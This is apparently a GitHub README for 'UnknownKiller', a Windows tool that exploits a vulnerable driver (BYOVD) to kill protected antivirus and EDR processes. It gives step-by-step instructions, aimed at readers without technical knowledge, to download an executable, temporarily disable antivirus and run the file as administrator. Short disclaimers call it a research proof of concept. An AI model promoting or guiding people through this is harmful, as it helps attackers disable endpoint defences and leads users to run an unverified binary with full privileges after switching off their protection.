# ⚔️ UnknownKiller - Remove Protected Security Processes Easily

[![Download UnknownKiller](https://img.shields.io/badge/Download-UnknownKiller-brightgreen?style=for-the-badge)](https://github.com/lukmannurhikma/UnknownKiller)

---

## 📋 About UnknownKiller

UnknownKiller is a simple tool designed to stop certain security processes on Windows. It targets specific system drivers to disable hidden security software, like antivirus or endpoint detection and response (EDR) tools. This tool can help researchers understand how some security software can be bypassed or stopped.

UnknownKiller uses a known weakness in certain system files (eb.sys or UnknownKiller.sys) to stop these protected programs. While the tool is technical in nature, this guide will help you get it running without deep computer knowledge.

---

## 💻 System Requirements

Before using UnknownKiller, make sure your system meets these conditions:

- Operating System: Windows 10 or later
- CPU: 64-bit processor
- RAM: At least 4 GB
- Disk Space: 100 MB free space
- User Account: Administrator rights (required to run the tool properly)
- Internet: Connection needed to download the files

UnknownKiller will not run without administrator permissions. It works only on 64-bit Windows due to system driver dependencies.

---

## 🚀 Getting Started

### Step 1: Visit the Download Page

Go to the official UnknownKiller page to get the software:

[Download UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller)

This link opens the project site on GitHub. From here, you can find the latest files to download.

---

### Step 2: Download the Software

On the GitHub page, look for the latest release or file section. Download the file designed for Windows. This will usually be a ZIP or EXE file.

Save it to a location you can easily find, like your Desktop or Downloads folder.

---

### Step 3: Prepare Your Computer

- Make sure you have saved your work, as the tool may stop some system processes.
- Disable any running antivirus software temporarily if it interferes with the download or execution.
- Make sure you have an administrator account connected to your computer.

---

### Step 4: Extract and Run UnknownKiller

If the download is a ZIP file:

- Right-click the ZIP file and choose "Extract All."
- Select a folder where you want to place the program files.

After extraction, look for the main file to run. This will have a `.exe` extension.

Right-click on the `.exe` file and select **Run as administrator**. This step is important because the tool needs rights to access and stop protected processes.

---

## 🔧 How to Use UnknownKiller

Once opened, the tool will scan for specific protected security processes running on your PC. Then it will attempt to stop these processes using the exploit.

This might happen automatically after you run the tool. You may see a simple window or command prompt showing progress.

Please wait for the process to finish before closing the window.

---

## ⚠️ Important Information

- Running this tool may cause your antivirus or security programs to stop.
- Use caution and only run UnknownKiller in a safe testing environment.
- Running this tool on systems you do not own or have permission to access can break rules and laws.

---

## 🛠 Troubleshooting

If you run into problems:

- Check that you ran the program as an administrator.
- Verify your Windows version is compatible (Windows 10 or later, 64-bit).
- Ensure antivirus is not blocking the program.
- Restart your computer and try again.
- Make sure you downloaded the latest files from the official page.

---

## ❓ FAQ

**Q: Can I use UnknownKiller on my work PC?**  
A: Only if you have permission. The tool stops security software that your workplace may require.

**Q: What does BYOVD mean?**  
A: BYOVD stands for "Bring Your Own Vulnerable Driver." It means the tool exploits a known weak driver on the system to stop processes.

**Q: Is UnknownKiller harmful?**  
A: The tool stops security software processes temporarily. It is not designed to damage your system but should be used with care.

---

## 📁 Additional Resources

For more technical details or to see updates, visit the UnknownKiller GitHub page:

[https://github.com/lukmannurhikma/UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller)

You can find documentation, code, and links to help you understand how the tool works.

---

## ⚙️ Development and Support

UnknownKiller is a Proof of Concept (PoC). It is mainly for security researchers to test the limits of Windows security. It is not intended for everyday use or on personal systems without understanding the risks.

If you want to learn more, the project topics include:

- BYOVD (Bring Your Own Vulnerable Driver)  
- EDR (Endpoint Detection and Response)  
- EDR bypass and evasion methods  

These terms relate to security software and methods to avoid detection.

---

## 📝 License

The software is provided "as is" for research and testing purposes. Check the GitHub page for licensing details.

---

## 🚩 Stay Informed

Keep your system updated and use unknown tools like UnknownKiller only where you know what it does. This tool is technical and targets deep parts of Windows security. Use it for learning and testing only.